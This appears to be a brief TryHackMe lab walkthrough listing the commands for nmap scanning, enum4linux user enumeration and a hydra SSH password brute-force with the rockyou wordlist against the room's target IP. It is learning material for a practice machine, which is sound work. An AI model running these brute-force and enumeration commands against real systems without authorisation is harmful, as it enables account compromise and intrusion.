### • 3. Open a Different terminal 'Remember not to close the vpn file till the work is done' and scan the Ip that was generated by THM while stsrting the machine and try saving the report by using ***nmap*** :
    sudo nmap -A -sV -vv -oN >file_name.txt< >IP< 
-A ⇨ to do all searchs </br>
-sV ⇨ to search for version </br>

### • 5. Try searching for hiddin directories inside the Ip by using ***gobuster*** :

### • 6. By openiing that directory in th webpge we can see the text thr and by seeing that we can understand that there are 2 user and ther name starts with K & J.

### • 7. To know the user names we will use enum4linux :
    enum4linux -a >IP<

### • 8. After getting the usernames we have to try for cracking the password { note that we are in ssh service } :
    hydra -l >username< -P /usr/share/wordlists/rockyou.txt ssh://>IP< -V 
 -l ⇨ for user </br>
 -P ⇨ for password wordlist </br>
 -V ⇨ to be able to see the process realtime </br>
